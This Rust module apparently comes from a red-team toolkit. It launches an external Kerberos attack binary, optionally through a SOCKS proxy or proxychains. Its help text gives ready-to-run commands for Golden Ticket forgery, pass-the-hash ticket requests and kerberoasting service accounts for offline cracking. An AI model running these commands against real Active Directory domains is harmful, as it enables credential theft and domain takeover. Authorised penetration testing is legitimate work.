use super::proxy_config::ProxyConfig;
use std::env;
use std::path::PathBuf;
use std::process::{Command, Stdio};

pub struct KerbtoolOutput {
    pub stdout: String,
    pub stderr: String,
    pub success: bool,
}

pub struct KerbtoolConfig {
    binary_path: PathBuf,
    socks_host: Option<String>,
    socks_port: Option<u16>,
}

impl KerbtoolConfig {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let binary_path = Self::find_kerbtool_binary()?;

        Ok(Self {
            binary_path,
            socks_host: None,
            socks_port: None,
        })
    }

    pub fn with_socks(mut self, host: String, port: u16) -> Self {
        self.socks_host = Some(host);
        self.socks_port = Some(port);
        self
    }

    fn find_kerbtool_binary() -> Result<PathBuf, Box<dyn std::error::Error>> {
        let possible_paths = vec![
            PathBuf::from("./bin/kerbtool"),
            PathBuf::from("./kerbtool"),
            PathBuf::from("/kerbtool"),
            env::current_exe()?.parent().unwrap().join("bin/kerbtool"),
        ];

        for path in possible_paths {
            if path.exists() {
                return Ok(path);
            }
        }

        Err(
            "Kerbtool binary not found. Expected in ./bin/kerbtool, ./kerbtool, or /kerbtool"
                .into(),
        )
    }

    pub fn build_command(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(&self.binary_path);

        for arg in args {
            cmd.arg(arg);
        }

        if let Some(ref host) = self.socks_host {
            cmd.arg("--socks-host").arg(host);
            if let Some(port) = self.socks_port {
                cmd.arg("--socks-port").arg(port.to_string());
            }
        }

        cmd.stdout(Stdio::piped());
        cmd.stderr(Stdio::piped());

        cmd
    }
}

pub fn run_kerbtool(kerbtool_args: &[&str]) -> Result<KerbtoolOutput, Box<dyn std::error::Error>> {
    if kerbtool_args.is_empty() || kerbtool_args[0] == "--help" || kerbtool_args[0] == "-h" {
        return Ok(KerbtoolOutput {
            stdout: get_help_text(),
            stderr: String::new(),
            success: true,
        });
    }

    let mut config = KerbtoolConfig::new()?;

    let proxychains_active = env::var("PROXYCHAINS_CONF_FILE").is_ok()
        || env::var("LD_PRELOAD")
            .map(|v| v.contains("proxychains"))
            .unwrap_or(false);

    let has_socks_in_args = kerbtool_args
        .iter()
        .any(|arg| arg.starts_with("--socks-host") || *arg == "--socks-host");

    if proxychains_active {
        println!("[*] Proxychains detected - Kerbtool will inherit proxy settings");
    } else if !has_socks_in_args {
        let proxy_config = ProxyConfig::load();
        if proxy_config.is_enabled() {
            println!(
                "[*] Applying SOCKS proxy: {}:{}",
                proxy_config.get_host(),
                proxy_config.get_port()
            );
            config =
                config.with_socks(proxy_config.get_host().to_string(), proxy_config.get_port());
        }
    }

    let mut cmd = config.build_command(kerbtool_args);

    let output = cmd.output().map_err(|e| {
        format!(
            "Failed to execute kerbtool binary at {:?}: {}",
            config.binary_path, e
        )
    })?;

    Ok(KerbtoolOutput {
        stdout: String::from_utf8_lossy(&output.stdout).to_string(),
        stderr: String::from_utf8_lossy(&output.stderr).to_string(),
        success: output.status.success(),
    })
}

fn get_help_text() -> String {
    r#"Kerbtool - Kerberos Attack Toolkit

Usage: kerbtool <service> [options]

Services:
  --ask-tgt             Request a TGT from the KDC
  --ask-st              Request a Service Ticket from the TGS
  --forge               Craft a TGT or ST using an AES or NT Hash
  --parse               Decrypt and inspect a provided ticket
  --convert             Convert between CCACHE and KIRBI formats
  --kerberoast          Request service ticket and extract hash for offline cracking

General options:
  -P, --port <port>           Kerberos Port (default 88)
  -d, --domain <domain>       Domain name to use for login
  -u, --user <username>       Username
  -p, --pass <pass>           Password
      --hash <NT Hash>        Hex encoded NT Hash for user password
  -n, --no-pass               Do not prompt for password
      --dc-ip <ip>            Optionally specify ip of KDC requesting tickets
      --aes-key <AES key>     Use a hex encoded AES128/256 key
      --socks-host <target>   Establish connection via a SOCKS5 proxy server
      --socks-port <port>     SOCKS5 proxy port (default 1080)
      --dns-host <ip:port>    Override system's default DNS resolver
      --dns-tcp               Force DNS lookups over TCP
  -t, --timeout               Dial timeout in seconds (default 5)
      --debug                 Enable debug logging
      --verbose               Enable verbose logging
  -v, --version               Show version

Examples:
  Ask TGT:
    kerbtool --ask-tgt --user administrator --domain corp.local --pass <password>
    kerbtool --ask-tgt --user administrator --domain corp.local --hash <NT hash>
    kerbtool --ask-tgt --user administrator --domain corp.local --aes-key <AES key>

  Ask ST:
    kerbtool --ask-st --user administrator --domain corp.local --pass <password> --spn cifs/dc01.corp.local
    kerbtool --ask-st --user administrator --domain corp.local --no-pass --spn cifs/dc01.corp.local

  Forge Golden Ticket:
    kerbtool --forge --target Administrator --domain corp.local --sign-aes <krbtgt AES> --domain-sid <SID>

  Convert Ticket:
    kerbtool --convert --in ticket.ccache --out ticket.kirbi

  Parse Ticket:
    kerbtool --parse --in ticket.ccache --sign-aes <AES key>

  Kerberoast:
    kerbtool --kerberoast --target <target_user> -u <your_user> -p <pass> -d <domain> --dc-ip <ip> --spn <spn>
    kerbtool --kerberoast --target svc_sql -u lowpriv -p Password123 -d corp.local --dc-ip 10.0.0.1 --spn MSSQLSvc/db01.corp.local:1433

Notes:
  - Tickets are automatically saved to current directory or KRB5CCNAME location
  - Use 'export' command in IronEye menu to set KRB5CCNAME environment variable
  - Use 'socks' command in IronEye menu to configure persistent SOCKS proxy
  - Kerbtool will use proxychains settings if running under proxychains
  - SOCKS proxy can be configured persistently or passed via --socks-host/--socks-port
  - Kerberoasting outputs TGS-REP hash suitable for hashcat/john
  - Use IronEye's 'Get SPNs' to identify kerberoastable accounts first
"#.to_string()
}
